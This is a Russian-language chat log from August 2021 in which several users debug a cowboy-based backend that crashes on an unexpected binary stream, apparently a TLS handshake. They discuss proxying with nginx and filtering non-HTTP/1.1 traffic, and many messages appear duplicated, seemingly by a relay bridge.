Timestamp	From	To	Message
2021-08-27 15:43:18.064 [info] <0.162.0> Data: <<22,3,1,2,0,1,0,1,252,3,3,14,44,33,56,26,185,206,231,236,178,193,16,165,188,27,22,214,160,174,190,146,134,183,85,117,16,235,49,77,234,9,129,32,12,245,86,126,154,166,11,108,160,171,200,195,227,185,95,124,147,27,250,187,108,120,82,136,198,154,167,107,53,75,254,175,0,32,250,250,19,3,19,1,19,2,204,169,204,168,192,43,192,47,192,44,192,48,192,19,192,20,0,156,0,157,0,47,0,53,1,0,1,147,138,138,0,0,0,0,0,20,0,18,0,0,15,109,97,105,108,46,103,111,111,103,108,101,46,99,111,109,0,23,0,0,255,1,0,1,0,0,10,0,10,0,8,202,202,0,29,0,23,0,24,0,11,0,2,1,0,0,35,0,0,0,16,0,14,0,12,2,104,50,8,104,116,116,112,47,49,46,49,0,5,0,5,1,0,0,0,0,0,13,0,18,0,16,4,3,8,4,4,1,5,3,8,5,5,1,8,6,6,1,0,18,0,0,0,51,0,43,0,41,202,202,0,1,0,0,29,0,32,18,248,125,69,188,229,9,34,184,87,206,13,209,25,177,114,240,187,218,2,250,42,123,238,190,210,236,200,51,78,3,30,0,45,0,2,1,1,0,43,0,11,10,42,42,3,4,3,3,3,2,3,1,0,27,0,3,2,0,2,68,105,0,5,0,3,2,104,50,170,170,0,1,0,0,21,0,196,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0>>
2021-08-27 12:54:00.998917	ttrr	buza	@defender если очень надо то я могу перехватывать такой краш - и не показывать его.
2021-08-27 12:55:03.822195	buza	ttrr	ничего не понятно
2021-08-27 12:55:03.823113	ttrr	buza	ничего не понятно
2021-08-27 12:55:15.832458	buza	ttrr	как это соотносится с HTTP-запросом? какая это его часть?
2021-08-27 12:55:15.833973	ttrr	buza	как это соотносится с HTTP-запросом? какая это его часть?
2021-08-27 12:55:54.277393	buza	ttrr	это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?
2021-08-27 12:55:54.278885	ttrr	buza	это после распаковки из контейнера multipart/form-data? или это данные вместе с контейнером?
2021-08-27 12:56:03.728703	buza	ttrr	или там вообще нет контейнера?
2021-08-27 12:56:03.729537	ttrr	buza	или там вообще нет контейнера?
2021-08-27 12:57:49.424858	buza	ttrr	сними соответствующие HTTP-запросы, поставь прокси перед сервером
2021-08-27 12:57:49.427043	ttrr	buza	сними соответствующие HTTP-запросы, поставь прокси перед сервером
2021-08-27 13:02:26.807514	ttrr	buza	это самое начало
2021-08-27 13:02:41.482226	ttrr	buza	вот как идет поток .. вот так и логирует
2021-08-27 13:03:07.916738	ttrr	buza	тебе в текстовом виде ? так там миллион управляющих символов каких-то
2021-08-27 13:03:14.346463	ttrr	buza	где то в середине http/1.1
2021-08-27 13:03:17.207162	ttrr	buza	виднеется
2021-08-27 13:03:42.533109	buza	ttrr	можно файлом
2021-08-27 13:03:42.549902	ttrr	buza	можно файлом
2021-08-27 13:04:01.499518	buza	ttrr	ты можешь локализовать сбойный байт?
2021-08-27 13:04:01.500649	ttrr	buza	ты можешь локализовать сбойный байт?
2021-08-27 13:04:01.818485	ttrr	buza	ок щас сделаю
2021-08-27 13:04:07.445032	buza	ttrr	даже хотя бы в этом потоке
2021-08-27 13:04:07.445839	ttrr	buza	даже хотя бы в этом потоке
2021-08-27 13:04:18.856934	buza	ttrr	сказать - байт номер такой-то приводит к вылету
2021-08-27 13:04:18.858832	ttrr	buza	сказать - байт номер такой-то приводит к вылету
2021-08-27 13:05:55.254009	ttrr	buza	он говорит что метода нет в хттп
2021-08-27 13:06:01.243998	ttrr	buza	cowboy_protocol:parse_method(<<>>
2021-08-27 13:06:06.854604	ttrr	buza	пустой - поток обрывается
2021-08-27 13:08:00.856211	ttrr	buza	наверно пришло время обновить либу .. а то она уже далеко вперед ушла
2021-08-27 13:09:11.124479	ttrr	buza	либа 6 летней давности
2021-08-27 13:09:39.654606	buza	ttrr	протокол не сильно менялся за эти 6 лет
2021-08-27 13:09:39.656168	ttrr	buza	протокол не сильно менялся за эти 6 лет
2021-08-27 13:11:32.564031	ttrr	buza	я бы сказал не менялся )
2021-08-27 13:12:55.662718	ttrr	buza	куда файл закинуть ?
2021-08-27 13:16:15.450574	ttrr	buza	https://disk.yandex.ru/d/zIsWj8NjR53tGg
2021-08-27 13:16:18.195383	ttrr	buza	вот 2 файла
2021-08-27 13:17:30.256973	ttrr	buza	flip и steller отправил приглашения
2021-08-27 13:18:23.925380	buza	ttrr	мне все равно пока ничего не ясно из файлов
2021-08-27 13:18:23.927316	ttrr	buza	мне все равно пока ничего не ясно из файлов
2021-08-27 13:18:59.117015	buza	ttrr	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:18:59.118802	ttrr	buza	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:21:57.110494	ttrr	buza	это бинарный поток который мне приходит ..
2021-08-27 13:22:00.248481	ttrr	buza	вот с первого байта
2021-08-27 13:22:25.681191	ttrr	buza	давайте поставлю nginx между клиентом и деро
2021-08-27 13:22:31.475796	ttrr	buza	поставь
2021-08-27 13:22:37.701730	ttrr	buza	и там может по логам что поймем
2021-08-27 13:22:37.844133	ttrr	buza	и пусть логирует все запросы ..
2021-08-27 13:22:46.285486	ttrr	buza	ок сейчас
2021-08-27 13:22:53.640201	ttrr	buza	запрос . тело . ответ
2021-08-27 13:23:09.182801	ttrr	buza	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:24:01.560672	ttrr	buza	а, драйвера не добавил сюда
2021-08-27 13:24:08.082850	ttrr	buza	нужен он?
2021-08-27 13:24:55.920814	ttrr	buza	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:25:13.262560	ttrr	buza	вот кто это генерит - тот и нужен ..
2021-08-27 13:28:48.359545	buza	ttrr	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:28:48.360902	ttrr	buza	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:28:57.835750	buza	ttrr	и нужно указание - что в нем криво
2021-08-27 13:28:57.836329	ttrr	buza	и нужно указание - что в нем криво
2021-08-27 13:34:50.150693	buza	ttrr	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:34:50.151702	ttrr	buza	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:39:46.752366	ttrr	buza	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:40:50.328851	buza	ttrr	подождем что дефендер скажет
2021-08-27 13:40:50.330919	ttrr	buza	подождем что дефендер скажет
2021-08-27 13:42:25.142860	ttrr	buza	мне все равно пока ничего не ясно из файлов
2021-08-27 13:42:25.143568	ttrr	buza	по-прежнему неясно что это вообще такое - это значение поля Data? я не могу так гадать
2021-08-27 13:42:25.144621	ttrr	buza	вот с первого байта
2021-08-27 13:42:25.145164	ttrr	buza	давайте поставлю nginx между клиентом и деро
2021-08-27 13:42:25.145420	ttrr	buza	это бинарный поток который мне приходит ..
2021-08-27 13:42:25.145817	ttrr	buza	поставь
2021-08-27 13:42:25.146216	ttrr	buza	и там может по логам что поймем
2021-08-27 13:42:25.146486	ttrr	buza	и пусть логирует все запросы ..
2021-08-27 13:42:25.146877	ttrr	buza	ок сейчас
2021-08-27 13:42:25.147896	ttrr	buza	я сменю порт у деро, на 8082 будут нджинкс принимать
2021-08-27 13:42:25.148161	ttrr	buza	запрос . тело . ответ
2021-08-27 13:42:25.148552	ttrr	buza	а, драйвера не добавил сюда
2021-08-27 13:42:25.148896	ttrr	buza	нужен он?
2021-08-27 13:42:25.149557	ttrr	buza	я хз . . я просто пишу сюда что вижу у себя .. а кто нужен я хз
2021-08-27 13:42:25.150109	ttrr	buza	вот кто это генерит - тот и нужен ..
2021-08-27 13:42:25.150642	ttrr	buza	нам нужен прилетевший сырой HTTP-запрос как есть
2021-08-27 13:42:25.151376	ttrr	buza	и нужно указание - что в нем криво
2021-08-27 13:42:25.151987	ttrr	buza	[16:24:01] <defender> а, драйвера не добавил сюда
обязательно нужен
2021-08-27 13:42:25.152713	ttrr	buza	> нам нужен прилетевший сырой HTTP-запрос как есть
я уже показал что мне прилетает .. вот это сырые данные
2021-08-27 13:42:25.153554	ttrr	buza	подождем что дефендер скажет
2021-08-27 13:49:10.567965	ttrr	buza	дело в том, что данные в dero посылает не один модуль
2021-08-27 13:49:18.701914	ttrr	buza	их много
2021-08-27 13:49:49.130176	buza	ttrr	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:49:49.134506	ttrr	buza	мы тут с зуласом разбираемся, там странно всё
2021-08-27 13:50:18.926960	ttrr	buza	нужно дорабатывать сущесутвующую, использовать другую либу, но чтобы ничего не падало
2021-08-27 13:53:32.721143	ttrr	buza	и расчитывать на то, что данные будут невалидные
2021-08-27 13:54:01.214288	ttrr	buza	их могут специально посылать
2021-08-27 13:56:32.227514	ttrr	buza	и расчитывать на то, что данные будут невалидные
2021-08-27 13:56:32.228063	ttrr	buza	их могут специально посылать
2021-08-27 13:58:05.088984	ttrr	buza	ну я либу могу модифицировать . просто чтобы если экзепшн в какой-то области .. то в лог не падало и даже ответ можно слать я думаю
2021-08-27 13:58:24.127639	buza	ttrr	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:24.130705	ttrr	buza	зулас говорит, что вот эти данные на яндекс диске - это и есть HTTP-запросы со всеми заголовками
2021-08-27 13:58:26.260873	buza	ttrr	точнее без них
2021-08-27 13:58:26.263766	ttrr	buza	точнее без них
2021-08-27 13:58:29.816978	buza	ttrr	а там бинарный поток
2021-08-27 13:58:29.818089	ttrr	buza	а там бинарный поток
2021-08-27 13:58:48.995649	buza	ttrr	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:58:48.997198	ttrr	buza	и если он хоть как-то парсится либой бэкенда, то это получается HTTP/2
2021-08-27 13:59:02.540606	buza	ttrr	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:02.542109	ttrr	buza	и тогда возникает вопрос
- откуда у нас вообще HTTP/2?
2021-08-27 13:59:21.601259	buza	ttrr	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:21.603372	ttrr	buza	ну или QUIC или еще какая бинарная гугловская фигня
2021-08-27 13:59:40.079016	buza	ttrr	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 13:59:40.080471	ttrr	buza	defender: на прокладках случайно не включена конверсия в HTTP/2 ?
2021-08-27 14:04:43.780200	ttrr	buza	нет
2021-08-27 14:04:57.491155	ttrr	buza	прокладки - роутеры, что приняли то и передали
2021-08-27 14:07:15.101595	ttrr	buza	отлучился
2021-08-27 14:09:00.005426	buza	ttrr	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:00.007195	ttrr	buza	defender: еще больше нужны сырые http-запросы теперь, в свете данных зуласа
2021-08-27 14:09:10.157884	buza	ttrr	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:10.160638	ttrr	buza	если подтвердится что там не HTTP/1.1 то это очень интересно
2021-08-27 14:09:16.331347	buza	ttrr	нужно подтверждение от тебя
2021-08-27 14:09:16.334894	ttrr	buza	нужно подтверждение от тебя
2021-08-27 14:14:50.297238	ttrr	buza	я делаю нджинкс
2021-08-27 14:15:45.062442	buza	ttrr	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:45.066224	ttrr	buza	кстати zulas: ты можешь "хороший" запрос проследить до базы?
2021-08-27 14:15:51.253427	buza	ttrr	вот тот бинарный
2021-08-27 14:15:51.256444	ttrr	buza	вот тот бинарный
2021-08-27 14:53:54.442245	ttrr	buza	что значит послать до базы ?
2021-08-27 14:53:58.874059	ttrr	buza	@buza
2021-08-27 14:54:32.238554	buza	ttrr	не послать, а проследить
2021-08-27 14:54:32.239541	ttrr	buza	не послать, а проследить
2021-08-27 14:54:40.782741	buza	ttrr	вот тебе пришел этот бинарный запрос
2021-08-27 14:54:40.785315	ttrr	buza	вот тебе пришел этот бинарный запрос
2021-08-27 14:54:51.035479	buza	ttrr	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 14:54:51.038342	ttrr	buza	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-27 14:55:04.009291	buza	ttrr	раз так, он должен положить в базу данных новую запись
2021-08-27 14:55:04.011151	ttrr	buza	раз так, он должен положить в базу данных новую запись
2021-08-27 14:55:10.352481	buza	ttrr	эту запись можно увидеть?
2021-08-27 14:55:10.355612	ttrr	buza	эту запись можно увидеть?
2021-08-27 14:55:14.255960	ttrr	buza	там больше нет ничего ..
2021-08-27 14:55:22.134185	ttrr	buza	ну т.е. до базы оно не доходит
2021-08-27 14:55:28.794895	buza	ttrr	ни первый ни второй?
2021-08-27 14:55:28.799081	ttrr	buza	ни первый ни второй?
2021-08-27 14:55:31.162587	ttrr	buza	просто в логи ничего не пишется
2021-08-27 14:55:37.827956	ttrr	buza	да
2021-08-27 14:55:50.741679	buza	ttrr	ну так может это и не мы?
2021-08-27 14:55:50.743607	ttrr	buza	ну так может это и не мы?
2021-08-27 14:55:50.934690	ttrr	buza	может это боты поисковые и т.п ?
2021-08-27 14:56:35.196483	buza	ttrr	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 14:56:35.199054	ttrr	buza	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
2021-08-27 14:56:48.976996	buza	ttrr	все HTTP/2 QUIC и прочий модный кал
2021-08-27 14:56:48.981091	ttrr	buza	все HTTP/2 QUIC и прочий модный кал
2021-08-27 14:57:01.397045	buza	ttrr	и запретить доступ к веб-серверу не с прокладки
2021-08-27 14:57:01.400904	ttrr	buza	и запретить доступ к веб-серверу не с прокладки
2021-08-30 07:55:38.729307	ttrr	buza	вот тебе пришел этот бинарный запрос
2021-08-30 07:55:38.730187	ttrr	buza	и ты говоришь что первый из них нормально парсится и отрабатывает
2021-08-30 07:55:38.731720	ttrr	buza	раз так, он должен положить в базу данных новую запись
2021-08-30 07:55:38.732592	ttrr	buza	эту запись можно увидеть?
2021-08-30 07:55:38.734866	ttrr	buza	там больше нет ничего ..
2021-08-30 07:55:38.736092	ttrr	buza	ну т.е. до базы оно не доходит
2021-08-30 07:55:38.736362	ttrr	buza	просто в логи ничего не пишется
2021-08-30 07:55:38.736556	ttrr	buza	ни первый ни второй?
2021-08-30 07:55:38.749881	ttrr	buza	да
2021-08-30 07:55:38.751220	ttrr	buza	ну так может это и не мы?
2021-08-30 07:55:38.752466	ttrr	buza	может это боты поисковые и т.п ?
2021-08-30 07:55:38.753796	ttrr	buza	defender: ты можешь на прокладках отрезать все что не HTTP/1.1 ?
